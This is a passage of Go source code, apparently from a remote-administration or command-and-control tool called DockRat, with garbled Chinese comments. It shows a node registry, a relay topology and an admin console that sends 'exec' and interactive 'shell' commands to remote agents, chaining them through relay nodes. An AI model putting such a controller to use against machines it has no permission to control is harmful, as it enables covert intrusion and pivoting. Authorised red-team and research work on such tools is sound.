	r.mu.Lock()
	defer r.mu.Unlock()

	nodes := make([]*Node, 0, len(r.nodes))
	for _, node := range r.nodes {
		nodes = append(nodes, node)
	}
	return nodes
}

func (r *Registry) Get(id int) (*Node, bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	node, ok := r.nodes[id]
	return node, ok
}

func (r *Registry) Remove(id int) {
	r.mu.Lock()
	defer r.mu.Unlock()
	delete(r.nodes, id)
}

func (n *Node) String() string {
	return fmt.Sprintf("Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s",
		n.ID, n.Addr, n.Hostname, n.Username, n.OS)
}

func (r *Registry) AddWithID(n *Node) {
	r.mu.Lock()
	defer r.mu.Unlock()

	id := n.ID
	r.nodes[id] = n
	if id >= r.nextID {
		r.nextID = id + 1
	}
}

æ–‡ä»¶ï¼š./core/node/topology.go
å†…å®¹ï¼š
// File: core/node/topology.go
package node

import (
	"fmt"
	"sync"
)

type NodeGraph struct {
	mu        sync.RWMutex
	parentMap map[int]int   // childID â†’ parentID
	childMap  map[int][]int // parentID â†’ []childID
}

func NewNodeGraph() *NodeGraph {
	return &NodeGraph{
		parentMap: make(map[int]int),
		childMap:  make(map[int][]int),
	}
}

// è®¾ç½® child çš„çˆ¶èŠ‚ç‚¹ï¼ˆä¼šè‡ªåŠ¨ä»åŸçˆ¶èŠ‚ç‚¹è§£ç»‘ï¼‰
func (g *NodeGraph) SetParent(childID int, parentID int) {
	g.mu.Lock()
	defer g.mu.Unlock()

	// å¦‚æœå·²æœ‰çˆ¶èŠ‚ç‚¹ï¼Œåˆ™ä»åŸçˆ¶èŠ‚ç‚¹çš„å­åˆ—è¡¨ä¸­ç§»é™¤
	if oldParent, ok := g.parentMap[childID]; ok {
		children := g.childMap[oldParent]
		newChildren := []int{}
		for _, cid := range children {
			if cid != childID {
				newChildren = append(newChildren, cid)
			}
		}
		g.childMap[oldParent] = newChildren
	}

	// è®¾ç½®æ–°çš„çˆ¶å­å…³ç³»
	g.parentMap[childID] = parentID
	g.childMap[parentID] = append(g.childMap[parentID], childID)
}

// è·å–æŸä¸ªèŠ‚ç‚¹çš„æ‰€æœ‰å­èŠ‚ç‚¹
func (g *NodeGraph) GetChildren(parentID int) []int {
	g.mu.RLock()
	defer g.mu.RUnlock()
	return append([]int{}, g.childMap[parentID]...) // è¿”å›å‰¯æœ¬é˜²æ­¢å¤–éƒ¨ä¿®æ”¹
}

// è·å–æŸä¸ªå­èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ IDï¼Œè‹¥æ— åˆ™ä¸º -1
func (g *NodeGraph) GetParent(childID int) int {
	g.mu.RLock()
	defer g.mu.RUnlock()
	if pid, ok := g.parentMap[childID]; ok {
		return pid
	}
	return -1
}

// åˆ é™¤èŠ‚ç‚¹åŠå…¶æ‹“æ‰‘å…³ç³»
func (g *NodeGraph) RemoveNode(id int) {
	g.mu.Lock()
	defer g.mu.Unlock()

	// ç§»é™¤çˆ¶æŒ‡é’ˆ
	delete(g.parentMap, id)

	// ç§»é™¤å­èŠ‚ç‚¹åˆ—è¡¨
	delete(g.childMap, id)

	// ä»å…¶ä»–äººçš„å­åˆ—è¡¨ä¸­åˆ é™¤è¯¥èŠ‚ç‚¹
	for pid, children := range g.childMap {
		newChildren := []int{}
		for _, cid := range children {
			if cid != id {
				newChildren = append(newChildren, cid)
			}
		}
		g.childMap[pid] = newChildren
	}
}
func (r *Registry) PrintTopology() {
	r.mu.Lock()
	defer r.mu.Unlock()

	fmt.Println("[+] Node Topology:")
	roots := []int{}
	for id := range r.nodes {
		if r.NodeGraph.GetParent(id) == -1 {
			roots = append(roots, id)
		}
	}

	for _, rootID := range roots {
		r.printSubtree(rootID, 0)
	}
}

func (r *Registry) printSubtree(id int, depth int) {
	node := r.nodes[id]
	prefix := ""
	for i := 0; i < depth; i++ {
		prefix += "  "
	}
	fmt.Printf("%s|- Node[%d] %s@%s (%s)\n", prefix, node.ID, node.Username, node.Hostname, node.OS)

	children := r.NodeGraph.GetChildren(id)
	for _, cid := range children {
		r.printSubtree(cid, depth+1)
	}
}

å­æ–‡ä»¶å¤¹ï¼š./core/protocol
æ–‡ä»¶ï¼š./core/protocol/command.go
å†…å®¹ï¼š
package protocol

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"

	"github.com/Singert/DockRat/core/node"
)

func StartConsole(registry *node.Registry) {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("(admin) >> ")
		if !scanner.Scan() {
			break
		}
		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		tokens := strings.SplitN(input, " ", 2)
		cmd := tokens[0]
		arg := ""
		if len(tokens) > 1 {
			arg = tokens[1]
		}

		switch cmd {
		case "detail":
			handleDetail(registry)
		case "exec":
			handleExec(arg, registry)
		case "shell":
			handleShell(arg, registry)
		case "startrelay":
			handleStartRelay(arg, registry)
		case "topo":
			handleTopo(registry)

		default:
			fmt.Println("[-] Unknown command")
		}
	}
}

func handleDetail(reg *node.Registry) {
	nodes := reg.List()
	fmt.Println("[+] Connected nodes:")
	for _, n := range nodes {
		fmt.Printf("  Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s\n",
			n.ID, n.Addr, n.Hostname, n.Username, n.OS)
	}
}

func handleExec(arg string, reg *node.Registry) {
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) != 2 {
		fmt.Println("[-] Usage: exec <id> <command>")
		return
	}
	var nid int
	fmt.Sscanf(parts[0], "%d", &nid)
	cmdPayload := map[string]string{"cmd": parts[1]}
	data, _ := json.Marshal(cmdPayload)
	msg := Message{Type: MsgCommand, Payload: data}

	if err := sendMessageOrRelay(nid, msg, reg); err != nil {
		fmt.Println("[-]", err)
	} else {
		fmt.Println("[+] Exec command sent.")
	}
}


func handleShell(arg string, reg *node.Registry) {
	var nid int
	fmt.Sscanf(arg, "%d", &nid)

	fmt.Println("[+] Shell started. Type commands (type 'exit' to quit):")
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("remote$ ")
		if !scanner.Scan() {
			break
		}
		line := scanner.Text()
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			continue // âœ… å¿½ç•¥ç©ºè¾“å…¥
		}
		if trimmed == "exit" {
			break
		}
		cmdMsg := Message{Type: MsgShell, Payload: []byte(line + "\n")}
		if err := sendMessageOrRelay(nid, cmdMsg, reg); err != nil {
			fmt.Println("[-] Shell write failed:", err)
			break
		}
	}
}

func handleStartRelay(arg string, reg *node.Registry) {
	parts := strings.Fields(arg)
	if len(parts) != 2 {
		fmt.Println("Usage: startrelay <node_id> <port>")
		return
	}
	var nid int
	port := parts[1]
	fmt.Sscanf(parts[0], "%d", &nid)

	// åˆ†é…ç¼–å·æ®µï¼ˆæ¯ä¸ª relay åˆ†é… 1000 ä¸ª IDï¼‰
	baseID := nid * 1000
	payload := StartRelayPayload{
		SelfID:     nid,
		ListenAddr: ":" + port,
		IDStart:    baseID + 1,
		Count:      999,
	}
	data, _ := json.Marshal(payload)
	msg := Message{
		Type:    MsgStartRelay,
		Payload: data,
	}

	// â—ä½¿ç”¨é€šç”¨å‘é€å‡½æ•°ï¼Œè‡ªåŠ¨ relay
	if err := sendMessageOrRelay(nid, msg, reg); err != nil {
		fmt.Println("[-] Failed to send startrelay:", err)
		return
	}
	fmt.Printf("[+] Sent startrelay to node %d, range = [%d ~ %d]\n", nid, payload.IDStart, payload.IDStart+payload.Count-1)
}
func handleTopo(reg *node.Registry) {
	reg.PrintTopology()
}
func sendMessageOrRelay(nid int, msg Message, reg *node.Registry) error {
	data, err := EncodeMessage(msg)
	if err != nil {
		return fmt.Errorf("encode failed: %w", err)
	}

	n, ok := reg.Get(nid)
	if !ok {
		return fmt.Errorf("no such node")
	}

	// âœ… å°è¯•ç›´æ¥å‘é€
	if n.Conn != nil {
		_, err := n.Conn.Write(data)
		return err
	}
	// âœ… å¦åˆ™å‘ä¸Š relay
	currID := nid
	var parentConn net.Conn
	for {
		pid := reg.NodeGraph.GetParent(currID)
		if pid == -1 {
			return fmt.Errorf("no relay path from node %d: reached root", nid)
		}

		parentNode, ok := reg.Get(pid)
		if ok && parentNode.Conn != nil {
			parentConn = parentNode.Conn
			break
		}

		currID = pid
	}

	packet := RelayPacket{
		DestID: nid,
		Data:   data,
	}
	pktBytes, err := json.Marshal(packet)
	if err != nil {
		return fmt.Errorf("relay packet marshal failed: %w", err)
	}

	wrapped := Message{
		Type:    MsgRelayPacket,
		Payload: pktBytes,
	}
	buf, err := EncodeMessage(wrapped)
	if err != nil {
		return fmt.Errorf("relay encode error: %w", err)
	}

	_, err = parentConn.Write(buf)
	return err



æ–‡ä»¶ï¼š./core/protocol/message.go
å†…å®¹ï¼š
package protocol

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"

	"github.com/Singert/DockRat/core/node"
)

// MessageType å®šä¹‰äº†æ¶ˆæ¯ç±»å‹ï¼Œå¦‚ handshakeã€shellã€upload ç­‰
type MessageType string

const (
	MsgHandshake MessageType = "handshake"
	MsgHeartbeat MessageType = "heartbeat"
	MsgCommand   MessageType = "command"
	MsgResponse  MessageType = "response"
	MsgShell     MessageType = "shell"

	// Relay
	MsgStartRelay    MessageType = "start_relay"    // Admin â†’ agentXï¼šå‘½ä»¤å…¶å¯åŠ¨ relay æ¨¡å¼
	MsgRelayReady    MessageType = "relay_ready"    // AgentX â†’ adminï¼šç›‘å¬å¯åŠ¨æˆåŠŸ
	MsgRelayRegister MessageType = "relay_register" // AgentX â†’ adminï¼šä¸ŠæŠ¥å­èŠ‚ç‚¹ä¿¡æ¯
	MsgRelayAck      MessageType = "relay_ack"      // Admin â†’ agentXï¼šæ³¨å†ŒæˆåŠŸç¡®è®¤
	MsgRelayError    MessageType = "relay_error"    // Admin â†’ agentXï¼šæ³¨å†Œå¤±è´¥è¯´æ˜
	MsgRelayPacket   MessageType = "relay_packet"   // ä»»æ„å±‚çº§é—´é€æ˜è½¬å‘æ¶ˆæ¯

)

// Message æ˜¯åŸºæœ¬é€šä¿¡ç»“æ„
// ç»“æ„ä½“ç»è¿‡ JSON ç¼–ç åå†åŠ ä¸Šé•¿åº¦å‰ç¼€å‘é€
type Message struct {
	Type    MessageType // such as handshake,shell,upload
	Payload []byte      // the data to be sent, such as command or file content
}
type HandshakePayload struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
}

// 1. å¯åŠ¨ relay è¯·æ±‚ï¼ˆadmin â†’ agentXï¼‰
type StartRelayPayload struct {
	SelfID     int    `json:"self_id"`     // relay èŠ‚ç‚¹è‡ªå·±çš„ ID
	ListenAddr string `json:"listen_addr"` // relay è¦ç›‘å¬çš„åœ°å€
	IDStart    int    `json:"id_start"`    // åˆ†é…ç»™è¯¥ relay çš„ç¼–å·æ®µèµ·å§‹
	Count      int    `json:"count"`       // åˆ†é…æ•°é‡ï¼ˆé»˜è®¤1000ï¼‰

}

// 2. relay å¯åŠ¨æˆåŠŸå›æŠ¥ï¼ˆagentX â†’ adminï¼‰
type RelayReadyPayload struct {
	SelfID     int    `json:"self_id"`     // relay èŠ‚ç‚¹è‡ªå·±çš„ ID
	ListenAddr string `json:"listen_addr"` // æˆåŠŸç›‘å¬çš„åœ°å€
}

// 3. relay å‘ admin ä¸ŠæŠ¥å­èŠ‚ç‚¹æ³¨å†Œè¯·æ±‚
type RelayRegisterPayload struct {
	ParentID int       `json:"parent_id"` // relay çš„ ID
	Node     node.Node `json:"node"`      // æ–°å­èŠ‚ç‚¹ä¿¡æ¯
}

// 4. æ³¨å†Œç»“æœåé¦ˆï¼ˆadmin â†’ relayï¼‰
type RelayAckPayload struct {
	Success bool   `json:"success"`
	Message string `json:"message,omitempty"` // å¯é€‰ä¿¡æ¯
}

// 5. é€šç”¨è½¬å‘æ¶ˆæ¯ï¼ˆrelay ç”¨äºå‘ä¸‹æˆ–å‘ä¸Šä¼ é€’ï¼‰
type RelayPacket struct {
	DestID int    `json:"dest_id"` // æœ€ç»ˆç›®æ ‡èŠ‚ç‚¹ ID
	Data   []byte `json:"data"`    // åŸå§‹ Message çš„å­—èŠ‚æµï¼ˆå³ protocol.EncodeMessage(...)ï¼‰
}

// EncodeMessage å°†Messageç¼–ç å¸¦é•¿åº¦å‰ç¼€çš„å­—èŠ‚æµ
func EncodeMessage(msg Message) ([]byte, error) {
	data, err := json.Marshal(msg)
	if err != nil {
		return nil, err
	}
	buf := new(bytes.Buffer)
	// å†™å…¥é•¿åº¦å‰ç¼€(å¤§ç«¯å­—èŠ‚åº)
	err = binary.Write(buf, binary.BigEndian, uint32(len(data)))
	if err != nil {
		return nil, err
	}
	// å†™å…¥æ¶ˆæ¯å†…å®¹
	_, err = buf.Write(data)
	if err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// DecodeMessage ä»å¸¦é•¿åº¦å‰ç¼€çš„å­—èŠ‚æµè§£ç ä¸ºMessage
func DecodeMessage(data []byte) (Message, error) {
	var msg Message
	if err := json.Unmarshal(data, &msg); err != nil {
		return msg, fmt.Errorf("decode json: %w", err)
	}
	return msg, nil
}

// ReadMessage ä»è¿æ¥ä¸­è¯»å–ä¸€ä¸ªå®Œæ•´çš„æ¶ˆæ¯å¸§ï¼ˆåŒ…æ‹¬é•¿åº¦å‰ç¼€å’Œå†…å®¹ï¼‰
func ReadMessage(reader *bytes.Reader) (Message, error) {
	var length uint32
	if err := binary.Read(reader, binary.BigEndian, &length); err != nil {
		return Message{}, fmt.Errorf("read length: %w", err)
	}
	msgData := make([]byte, length)
	if _, err := reader.Read(msgData); err != nil {
		return Message{}, fmt.Errorf("read payload: %w", err)
	}
	return DecodeMessage(msgData)

}

